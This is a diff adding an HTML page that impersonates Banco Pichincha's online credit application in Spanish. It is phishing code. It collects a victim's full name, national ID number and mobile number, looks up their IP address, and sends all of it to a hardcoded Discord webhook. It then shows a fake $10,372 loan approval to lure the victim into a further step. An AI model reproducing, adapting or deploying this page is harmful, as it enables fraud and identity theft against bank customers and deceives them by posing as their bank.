@@ -1,0 +1,658 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crédito en Línea - Banco Pichincha</title>
+  <style>
+    :root {
+      --pichincha-yellow: #ffdd00;
+      --pichincha-blue: #0d2c6c;
+      --pichincha-blue-hover: #081d4a;
+      --bg-gray: #f4f6f9;
+      --card-bg: #ffffff;
+      --text-dark: #1f2937;
+      --text-muted: #6b7280;
+      --error: #dc2626;
+      --border-gray: #e5e7eb;
+
+      /* AJUSTE DE DIMENSIONES DEL CARRUSEL */
+      --hero-height: 120px;      /* Alto de las imágenes */
+      --hero-max-width: 99%;    /* Ancho del contenedor */
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: #0b1a30;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: var(--text-dark);
+    }
+
+    .mobile-container {
+      width: 100%;
+      max-width: 420px;
+      min-height: 100vh;
+      background-color: var(--bg-gray);
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+    }
+
+    .pichincha-header {
+      background-color: #ffffff;
+      padding: 1rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-bottom: 1px solid var(--border-gray);
+      z-index: 10;
+    }
+
+    .brand-logo {
+      height: 38px;
+      width: auto;
+      object-fit: contain;
+    }
+
+    /* ESTILOS DEL CARRUSEL DE IMÁGENES INFINITO */
+    .carousel-container {
+      width: var(--hero-max-width);
+      height: var(--hero-height);
+      margin: 0 auto;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .carousel-track {
+      display: flex;
+      width: 400%; /* 3 imágenes + 1 duplicada para bucle suave = 400% */
+      height: 100%;
+      transition: transform 0.5s ease-in-out;
+    }
+
+    .carousel-track img {
+      width: 25%; /* Cada una ocupa un 25% (1/4) */
+      height: 100%;
+      object-fit: cover;
+      flex-shrink: 0;
+    }
+
+    .card-sheet {
+      background: var(--card-bg);
+      margin-top: -20px;
+      border-radius: 20px 20px 0 0;
+      padding: 1.8rem 1.5rem;
+      flex-grow: 1;
+      box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.08);
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      z-index: 2;
+    }
+
+    .mobile-container.no-hero {
+      background-color: var(--card-bg);
+    }
+
+    .mobile-container.no-hero .carousel-container {
+      display: none;
+    }
+
+    .mobile-container.no-hero .card-sheet {
+      margin-top: 0;
+      border-radius: 0;
+      box-shadow: none;
+      justify-content: flex-start;
+      padding-top: 1.5rem;
+    }
+
+    h2 {
+      color: var(--pichincha-blue);
+      font-size: 1.35rem;
+      margin-bottom: 0.4rem;
+      text-align: center;
+      font-weight: 700;
+    }
+
+    .subtitle {
+      color: var(--text-muted);
+      font-size: 0.88rem;
+      text-align: center;
+      margin-bottom: 1.5rem;
+      line-height: 1.4;
+    }
+
+    .form-group {
+      margin-bottom: 1.1rem;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.4rem;
+      color: var(--pichincha-blue);
+      font-weight: 600;
+      font-size: 0.85rem;
+    }
+
+    input[type="text"],
+    input[type="tel"] {
+      width: 100%;
+      padding: 0.8rem 0.9rem;
+      border: 1px solid var(--border-gray);
+      border-radius: 8px;
+      font-size: 0.95rem;
+      background-color: #fff;
+      color: var(--text-dark);
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: var(--pichincha-blue);
+      box-shadow: 0 0 0 3px rgba(13, 44, 108, 0.1);
+    }
+
+    .terms-group {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin: 1.2rem 0 1.5rem 0;
+    }
+
+    .terms-group input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      margin-top: 2px;
+      accent-color: var(--pichincha-blue);
+      cursor: pointer;
+    }
+
+    .terms-group label {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      font-weight: normal;
+      line-height: 1.35;
+      cursor: pointer;
+    }
+
+    .terms-group a {
+      color: var(--pichincha-blue);
+      font-weight: 600;
+      text-decoration: underline;
+    }
+
+    .error-message {
+      color: var(--error);
+      font-size: 0.78rem;
+      margin-top: 0.3rem;
+      display: none;
+      font-weight: 500;
+    }
+
+    button {
+      width: 100%;
+      padding: 0.95rem;
+      background-color: var(--pichincha-blue);
+      color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+
+    button:hover:not(:disabled) {
+      background-color: var(--pichincha-blue-hover);
+    }
+
+    button:disabled {
+      background-color: #d1d5db;
+      color: #9ca3af;
+      cursor: not-allowed;
+    }
+
+    /* PASO 2 */
+    #step2 {
+      display: none;
+    }
+
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      background-color: #e0f2fe;
+      color: #0369a1;
+      padding: 0.4rem 0.8rem;
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      width: fit-content;
+      margin: 0 auto 1rem auto;
+    }
+
+    .greeting-title {
+      font-size: 1.4rem;
+      color: var(--pichincha-blue);
+      margin-bottom: 0.2rem;
+      text-align: center;
+    }
+
+    .cedula-text {
+      font-size: 0.85rem;
+      color: var(--text-muted);
+      margin-bottom: 1.2rem;
+      font-weight: 500;
+      text-align: center;
+    }
+
+    .approval-banner {
+      background: linear-gradient(135deg, #ffffff 0%, #fffde6 100%);
+      border: 1px solid var(--pichincha-yellow);
+      border-left: 5px solid var(--pichincha-yellow);
+      border-radius: 10px;
+      padding: 1.2rem;
+      margin-bottom: 1.2rem;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+      text-align: center;
+    }
+
+    .approval-banner .tag {
+      font-size: 0.75rem;
+      color: var(--pichincha-blue);
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      display: block;
+      margin-bottom: 0.3rem;
+    }
+
+    .approval-banner h3 {
+      font-size: 2.3rem;
+      color: var(--pichincha-blue);
+      font-weight: 800;
+      line-height: 1;
+    }
+
+    .details-box {
+      background-color: #f8fafc;
+      border: 1px solid var(--border-gray);
+      border-radius: 10px;
+      padding: 1rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .details-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0.4rem 0;
+      font-size: 0.9rem;
+      color: var(--text-dark);
+    }
+
+    .details-row:not(:last-child) {
+      border-bottom: 1px dashed var(--border-gray);
+    }
+
+    .details-row span {
+      color: var(--text-muted);
+      font-weight: 500;
+    }
+
+    .details-row strong {
+      color: var(--pichincha-blue);
+      font-weight: 700;
+    }
+
+    .info-box {
+      background-color: #fffbe3;
+      border: 1px solid #fef08a;
+      color: #715c00;
+      padding: 0.8rem;
+      border-radius: 8px;
+      font-size: 0.8rem;
+      line-height: 1.4;
+      margin-bottom: 1.2rem;
+    }
+
+    .button-group {
+      display: flex;
+      flex-direction: column;
+      gap: 0.8rem;
+    }
+
+    .btn-secondary {
+      background-color: transparent;
+      color: var(--pichincha-blue);
+      border: 2px solid var(--pichincha-blue);
+    }
+
+    .btn-secondary:hover {
+      background-color: #f0f4fc;
+    }
+
+    /* PASO 3 */
+    #step3 {
+      display: none;
+      text-align: center;
+    }
+
+    .icon-notice {
+      font-size: 3rem;
+      margin-bottom: 0.8rem;
+    }
+
+    .alert-card {
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      border-radius: 12px;
+      padding: 1.4rem 1.2rem;
+      color: var(--text-dark);
+      font-size: 0.9rem;
+      line-height: 1.5;
+    }
+
+    .alert-card strong {
+      color: var(--pichincha-blue);
+    }
+
+    .alert-card .highlight-red {
+      color: var(--error);
+      display: block;
+      margin-top: 0.8rem;
+      font-weight: 700;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="mobile-container" id="mainContainer">
+    <div class="pichincha-header">
+      <img 
+        src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original" 
+        alt="Banco Pichincha" 
+        class="brand-logo"
+      >
+    </div>
+
+    <!-- CONTENEDOR DEL CARRUSEL DE 3 IMÁGENES (+1 Duplicada) -->
+    <div class="carousel-container" id="carousel">
+      <div class="carousel-track" id="carouselTrack">
+        <img src="https://www.bancopichincha.com.co/documents/37198/38952/Cr%C3%A9dito+de+Cartera+_Desktop.jpg/2a659e50-6fd3-3e96-160e-ee59e7f2ecee?t=1777043582123" alt="Banner 1">
+        <img src="https://www.bancopichincha.com.co/documents/37198/38855/Cr%C3%A9dito+de+Tesorer%C3%ADa_Desktop.jpg/f06f47e3-c719-9841-58ca-73bbf00a19cd?t=1777043057597" alt="Banner 2">
+        <img src="https://www.bancopichincha.com.co/documents/37198/38689/01.+Capital+de+Trabajo+Desktop.png/30da9a49-69e1-8729-9e0a-738cbf83592e?t=1777042448633" alt="Banner 3">
+        <!-- Copia de la imagen 1 para el efecto continuo -->
+        <img src="https://www.bancopichincha.com.co/documents/37198/38952/Cr%C3%A9dito+de+Cartera+_Desktop.jpg/2a659e50-6fd3-3e96-160e-ee59e7f2ecee?t=1777043582123" alt="Banner 1 Duplicada">
+      </div>
+    </div>
+
+    <div class="card-sheet">
+      <!-- PASO 1 -->
+      <div id="step1">
+        <h2>Solicitud de Crédito</h2>
+        <p class="subtitle">Ingresa tus datos para verificar las ofertas de crédito disponibles para ti.</p>
+
+        <form id="registroForm" novalidate>
+          <div class="form-group">
+            <label for="nombre">Nombres y Apellidos completos</label>
+            <input 
+              type="text" 
+              id="nombre" 
+              name="nombre" 
+              placeholder="Ej. Juan Carlos Pérez"
+              required
+            >
+            <span class="error-message" id="nombreError">Ingrese su nombre completo</span>
+          </div>
+
+          <div class="form-group">
+            <label for="cedula">Número de Cédula</label>
+            <input 
+              type="text" 
+              id="cedula" 
+              name="cedula" 
+              maxlength="10" 
+              placeholder="17xxxxxxxx"
+              required
+            >
+            <span class="error-message" id="cedulaError">Ingrese una cédula válida (10 dígitos)</span>
+          </div>
+
+          <div class="form-group">
+            <label for="celular">Número Celular</label>
+            <input 
+              type="tel" 
+              id="celular" 
+              name="celular" 
+              maxlength="10" 
+              placeholder="09xxxxxxxx"
+              required
+            >
+            <span class="error-message" id="celularError">Debe iniciar con 09 y tener 10 dígitos</span>
+          </div>
+
+          <div class="terms-group">
+            <input type="checkbox" id="aceptoTerminos">
+            <label for="aceptoTerminos">
+              Acepto los <a href="#" onclick="alert('Términos y condiciones'); return false;">Términos y Condiciones</a> y autorizo la consulta de mis datos.
+            </label>
+          </div>
+
+          <button type="submit" id="btnSubmit" disabled>Continuar</button>
+        </form>
+      </div>
+
+      <!-- PASO 2 -->
+      <div id="step2">
+        <div class="security-badge">
+          🔒 Conexión Encriptada
+        </div>
+
+        <h2 class="greeting-title" id="greetingName">Hola, [Nombre]</h2>
+        <p class="cedula-text" id="displayCedula">C.I. [Cédula]</p>
+
+        <div class="approval-banner">
+          <span class="tag">Monto Aprobado</span>
+          <h3>$10.372,00</h3>
+        </div>
+
+        <div class="details-box">
+          <div class="details-row">
+            <span>Tasa de interés:</span>
+            <strong>5.7% fija</strong>
+          </div>
+          <div class="details-row">
+            <span>Plazo:</span>
+            <strong>48 meses</strong>
+          </div>
+          <div class="details-row">
+            <span>Cuota mensual:</span>
+            <strong>$128,00</strong>
+          </div>
+        </div>
+
+        <div class="info-box">
+          <strong>📌 Importante:</strong> El desembolso digital solo está disponible para usuarios con cuenta activa en Banco Pichincha.
+        </div>
+
+        <div class="button-group">
+          <button type="button" id="btnSoyCliente">Soy cliente</button>
+          <button type="button" id="btnNoSoyCliente" class="btn-secondary">No poseo cuenta activa</button>
+        </div>
+      </div>
+
+      <!-- PASO 3 -->
+      <div id="step3">
+        <div class="icon-notice">🏦</div>
+        <h2>Estimado/a Cliente</h2>
+        <br>
+        <div class="alert-card">
+          <strong id="step3Name">[Nombre]</strong>, no podemos continuar con el desembolso en línea debido a que esta preaprobación requiere de una cuenta activa.
+          <span class="highlight-red">Por favor, acércate a la agencia Pichincha más cercana para completar tu proceso.</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1550513162787356885/jkZw5LNE6SFPdQlvTCopyg1XZZmGzCKLkpNkuRYXqjrQjRKYy4M2ea7_hkhAv2INcb1M";
+
+    /* LÓGICA DE TRANSICIÓN INFINITA SIN RETROCESO */
+    const track = document.getElementById('carouselTrack');
+    let currentSlide = 0;
+    const realSlides = 3; // N° de imágenes reales
+
+    setInterval(() => {
+      currentSlide++;
+      track.style.transition = 'transform 0.5s ease-in-out';
+      track.style.transform = `translateX(-${currentSlide * 25}%)`;
+
+      // Cuando llega a la imagen duplicada (índice 3)
+      if (currentSlide === realSlides) {
+        setTimeout(() => {
+          // Desactiva la animación momentáneamente para volver a la imagen 0 sin que se note
+          track.style.transition = 'none';
+          currentSlide = 0;
+          track.style.transform = `translateX(0%)`;
+        }, 500); // 500ms coincide con la duración de la animación CSS
+      }
+    }, 3000); // Cambia cada 3 segundos
+
+    const aceptoCheckbox = document.getElementById('aceptoTerminos');
+    const btnSubmit = document.getElementById('btnSubmit');
+
+    aceptoCheckbox.addEventListener('change', function() {
+      btnSubmit.disabled = !this.checked;
+    });
+
+    function validarNombre(nombre) {
+      return nombre.trim().length >= 3;
+    }
+
+    function validarCedulaSimple(cedula) {
+      return /^\d{10}$/.test(cedula);
+    }
+
+    function validarCelular(celular) {
+      return /^09\d{8}$/.test(celular);
+    }
+
+    async function obtenerIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch (error) {
+        return 'No disponible';
+      }
+    }
+
+    document.getElementById('registroForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const nombreInput = document.getElementById('nombre');
+      const cedulaInput = document.getElementById('cedula');
+      const celularInput = document.getElementById('celular');
+
+      const nombreError = document.getElementById('nombreError');
+      const cedulaError = document.getElementById('cedulaError');
+      const celularError = document.getElementById('celularError');
+
+      let esValido = true;
+
+      if (!validarNombre(nombreInput.value)) {
+        nombreError.style.display = 'block';
+        nombreInput.style.borderColor = 'var(--error)';
+        esValido = false;
+      } else {
+        nombreError.style.display = 'none';
+        nombreInput.style.borderColor = 'var(--border-gray)';
+      }
+
+      if (!validarCedulaSimple(cedulaInput.value.trim())) {
+        cedulaError.style.display = 'block';
+        cedulaInput.style.borderColor = 'var(--error)';
+        esValido = false;
+      } else {
+        cedulaError.style.display = 'none';
+        cedulaInput.style.borderColor = 'var(--border-gray)';
+      }
+
+      if (!validarCelular(celularInput.value.trim())) {
+        celularError.style.display = 'block';
+        celularInput.style.borderColor = 'var(--error)';
+        esValido = false;
+      } else {
+        celularError.style.display = 'none';
+        celularInput.style.borderColor = 'var(--border-gray)';
+      }
+
+      if (esValido) {
+        btnSubmit.disabled = true;
+        btnSubmit.innerText = "Verificando...";
+
+        const userIP = await obtenerIP();
+
+        const payload = {
+          embeds: [
+            {
+              title: "🏦 Pichincha - Solicitud de Crédito",
+              color: 16768256,
+              fields: [
+                { name: "👤 Nombre", value: nombreInput.value.trim(), inline: false },
+                { name: "🪪 Cédula", value: cedulaInput.value.trim(), inline: true },
+                { name: "📱 Celular", value: celularInput.value.trim(), inline: true },
+                { name: "🌐 IP Cliente", value: userIP, inline: false }
+              ],
+              timestamp: new Date().toISOString()
+            }
+          ]
+        };
+
+        try {
+          await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+        } catch (error) {
+          console.error("Error Discord:", error);
+        }
+
+        const nombreVal = nombreInput.value.trim();
+        document.getElementById('greetingName').innerText = `Hola, ${nombreVal}`;
+        document.getElementById('step3Name').innerText = nombreVal;
+        document.getElementById('displayCedula').innerText = `C.I. ${cedulaInput.value.trim()}`;
+
+        document.getElementById('mainContainer').classList.add('no-hero');
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+      }
+    });
+
+    document.getElementById('btnSoyCliente').addEventListener('click', function() {
+      window.location.href = "index2.html";
+    });
+
+    document.getElementById('btnNoSoyCliente').addEventListener('click', function() {
+      document.getElementById('step2').style.display = 'none';
+      document.getElementById('step3').style.display = 'block';
+    });
+  </script>
+
+<script src="https://replit-cdn.com/replit-pill/replit-pill.global.js" data-referral-code="351t1cenx6wu" data-repl-id="fc958af4-4c33-4b68-9a96-9e24708a63f9"></script></body>
+</html>
